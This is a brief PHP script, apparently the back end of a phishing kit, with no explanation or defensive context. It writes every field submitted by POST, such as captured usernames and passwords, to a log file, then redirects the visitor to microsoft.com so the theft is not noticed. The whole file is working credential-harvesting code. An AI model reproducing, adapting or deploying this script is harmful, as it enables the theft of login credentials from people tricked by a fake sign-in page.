<?php
include("config.php");
if($_POST){
	$f = fopen("$log_file","a");
	if(fwrite($f, json_encode($_POST)."\n")){
		header('Location: http://microsoft.com/');
	}else{
		header('Location: http://'.$_SERVER['HTTP_HOST'].'/');
	}
	fclose($f);
}else{
	header('Location: http://'.$_SERVER['HTTP_HOST'].'/');
}
?>